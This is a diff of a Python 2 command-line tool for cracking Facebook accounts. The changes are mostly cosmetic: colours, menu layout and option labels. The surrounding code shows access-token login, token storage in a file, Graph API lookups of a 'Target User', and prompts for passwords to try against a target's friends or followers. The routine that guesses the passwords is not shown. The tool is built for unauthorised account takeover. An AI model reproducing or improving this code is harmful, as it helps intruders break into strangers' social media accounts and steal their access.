@@ -56,7 +56,7 @@ banner="""
 \033[1;91m  ╔═══════════════════•ೋೋ•═══════════════════╗ 
 \033[1;91m  █ \033[1;92m /﹋\      \033[1;91m[•] Author    : \033[1;92mRishu Khan    \033[1;91m█
 \033[1;91m  █ \033[1;92m(҂`_´)     \033[1;91m[•] Facebook  : \033[1;92mRishu 3:)     \033[1;91m█
-\033[1;91m  █ \033[90;1m<,︻╦╤─--💥\033[1;91m[•] Version   : \033[1;92m0.2           \033[1;91m█
+\033[1;91m  █ \033[1;92m<,︻╦╤─--💥\033[1;91m[•] Version   : \033[1;92m0.2           \033[1;91m█
 \033[1;91m  █ \033[1;92m /﹋\     If You dream it can you do it  \033[1;91m█
 \033[1;91m  ╚═══════════════════•ೋೋ•═══════════════════╝
 """
@@ -104,21 +104,21 @@ def user_info():
 def menu_login():
 	os.system("clear")
 	print banner
-        print ("\033[1;91m╔════════════•ೋೋ•════════════╗")
-	print("\033[1;91m[1] \033[1;92mLogin With Access Token")
-	print("\033[1;91m[2] \033[1;92mLogin With Fb Password")
-	print("\033[1;91m[0] \033[1;92mDirect Exir")
-	print ("\033[1;91m╚════════════•ೋೋ•════════════╝")
+        print("\033[1;91m ╔════════════•ೋೋ•════════════╗")
+	print("\033[1;91m  [1] \033[1;92mLogin With Access Token")
+	print("\033[1;91m  [2] \033[1;92mLogin With Fb Password")
+	print("\033[1;91m  [0] \033[1;92mDirect Exir")
+	print("\033[1;91m ╚════════════•ೋೋ•════════════╝")
 	print(50*"-")
 	menu_login2() 
 def menu_login2():
-	user_select = raw_input("\n\033[1;91m[!] Choose ---> ")
+	user_select = raw_input("\n\033[1;92m[!] \033[1;91mChoose ---> ")
 	if user_select =="1":
 		os.system("clear")
 		print banner
 		print("\033[1;92mLogin With Token").center(50)
 		print("")
-                token = raw_input("\033[1;92m[!] Put Token : \033[36;1m")
+                token = raw_input("\033[1;91m[!] \033[1;92mPut Token : \033[90;1m")
                 token_ab = open("access_token.txt", "w")
                 token_ab.write(token)
                 token_ab.close()
@@ -191,17 +191,17 @@ def menu():
     print banner
     print("\033[0;92m\tlogged user : " +name)
     print("")
-    print("\033[1;91m╔════════════•ೋೋ•══════════════╗")
-    print("\033[1;91m [1] \033[1;92mClone Friendlist And Public ID")
-    print("\033[1;91m [2] \033[1;92mClone With Auto Password")
-    print("\033[1;91m [3] \033[1;92mView Your Login Token")
-    print("\033[1;91m [4] \033[1;92mUpdate Tool")
-    print("\033[1;91m [0] \033[1;92mMain Menu Back")
-    print("\033[1;91m╚═════════════•ೋೋ•═════════════╝")
+    print("\033[1;91m ╔══════════════•ೋೋ•══════════════╗")
+    print("\033[1;91m  [1] \033[1;92mClone Friendlist And Public ID")
+    print("\033[1;91m  [2] \033[1;92mClone With Choose Password")
+    print("\033[1;91m  [3] \033[1;92mView Your Login Token")
+    print("\033[1;91m  [4] \033[1;92mUpdate Tool")
+    print("\033[1;91m  [0] \033[1;92mMain Menu Back")
+    print("\033[1;91m ╚═══════════════•ೋೋ•═════════════╝")
     print(50*"-")
     menu_select()
 def menu_select():
-	select = raw_input("\n\033[1;91m[!] Choose : ")
+	select = raw_input("\n\033[1;92m[!] \033[1;91mChoose : ")
 	if select =="1":
 		crack()
 	elif select =="2":
@@ -239,28 +239,28 @@ def crack():
 		menu_login()
 	os.system("clear")
 	print banner
-        print("\033[1;91m╔════════════•ೋೋ•═════════════╗")
-	print("\033[1;91m[1] \033[1;92mCrack With Public ID/Link")
-	print("\033[1;91m[2] \033[1;92mCrack With Followers ID/Links")
-	print("\033[1;91m[0] \033[1;92mDirect Back")
-	print("\033[1;91m╚════════════•ೋೋ•═════════════╝")
+        print("\033[1;91m ╔════════════•ೋೋ•═══════════╗")
+	print("\033[1;91m  [1] \033[1;92mCrack Public Id")
+	print("\033[1;91m  [2] \033[1;92mCrack Followers id")
+	print("\033[1;91m  [0] \033[1;92mDirect Back")
+	print("\033[1;91m ╚════════════•ೋೋ•═══════════╝")
 	print(50*"-")
 	crack_select()
 def crack_select():
-	select = raw_input("\033[1;91m[!] Choose option: ")
+	select = raw_input("\033[1;92m[!] \033[1;91mChoose option: ")
 	id=[]
 	oks=[]
 	cps=[]
 	if select =="1":
 		os.system("clear")
 		print banner
-		idt = raw_input("\033[1;91m[!] Put ID/Username : ")
+		idt = raw_input("\033[1;91m[!] \033[1;92mPut ID/Username : ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
 			os.system('clear')
 			print banner
-			print("\033[1;91m[!] Target User : "+q["\033[1;92mname"])
+			print("\033[1;92m[!] \033[1;91mTarget User : "+q["name"])
 		except KeyError:
 			print("")
 			print("\033[1;91mInvalid Link Or Friendlist Has Privact").center(50)
@@ -277,13 +277,13 @@ def crack_select():
 	elif select =="2":
 		os.system("clear")
 		print banner
-		idt = raw_input("\033[1;91m[!] Put ID/Username : ")
+		idt = raw_input("\033[1;91m[!] \033[1;92mPut ID/Username : ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
 			os.system("clear")
 			print banner
-			print("\033[1;91m[!] Target User : "+qm["\033[1;92mname"])
+			print("\033[1;91m[!] \033[1;92mTarget User : "+qm["name"])
 		except KeyError:
 			print("\t\033[1;91mInvalid id link")
 			print("")
@@ -510,11 +510,11 @@ def choose():
 		menu_login()
 	os.system("clear")
 	print banner
-        print ("\033[1;91m╔════════════•ೋೋ•════════════╗")
-	print("\033[1;91m[1] \033[1;92mCrack With Public ID/Link")
-	print("\033[1;91m[2] \033[1;92mCrack With Follwers ID/Link")
-	print("\033[1;91m[0] \033[1;92mMain Menu Back")
-	print ("\033[1;91m╚════════════•ೋೋ•════════════╝")
+        print("\033[1;91m ╔════════════•ೋೋ•════════════╗")
+	print("\033[1;91m  [1] \033[1;92mCrack With Public ID/Link")
+	print("\033[1;91m  [2] \033[1;92mCrack With Follwers ID/Link")
+	print("\033[1;91m  [0] \033[1;92mMain Menu Back")
+	print("\033[1;91m ╚════════════•ೋೋ•════════════╝")
 	print(50*"-")
 	choice_select()
 def choice_select():
@@ -525,7 +525,7 @@ def choice_select():
 	if select =="1":
 		os.system("clear")
 		print banner
-		idt = raw_input("[!] \033[1;92mPut ID/Username  : ")
+		idt = raw_input("\033[1;91m[!] \033[1;92mPut ID/Username  : ")
 		print("")
 		pass1 = raw_input("\033[1;91m[1] Enter Password :\033[1;92m ")
 		pass2 = raw_input("\033[1;91m[2] Enter Password :\033[1;92m ")
@@ -537,7 +537,7 @@ def choice_select():
 			q = json.loads(r.text)
 			os.system('clear')
 			print banner
-			print("[!] \033[1;91mTarget User : "+q["\033[1;92mname"])
+			print("\033[1;91m[!] \033[1;92mTarget User : "+q["name"])
 		except KeyError:
 			print("")
 			print("\033[1;91mPublic ID Not Found").center(50)
@@ -554,7 +554,7 @@ def choice_select():
 	elif select =="2":
 		os.system("clear")
 		print banner
-		idt = raw_input("[!] \033[1;92mPut ID/Username  : ")
+		idt = raw_input("\033[1;91m[!] \033[1;92mPut ID/Username  : ")
 		print("")
 		pass1 = raw_input("\033[1;91m[1] Enter Password :\033[1;92m ")
 		pass2 = raw_input("\033[1;91m[2] Enter Password :\033[1;92m ")
@@ -566,7 +566,7 @@ def choice_select():
 			q = json.loads(r.text)
 			os.system('clear')
 			print banner
-			print("[!] \033[1;91mTarget User : "+q["\033[1;92mname"])
+			print("\033[1;91m[!] \033[1;92mTarget User : "+q["name"])
 		except KeyError:
 			print("")
 			print("\033[1;91mPublic ID Not Found").center(50)
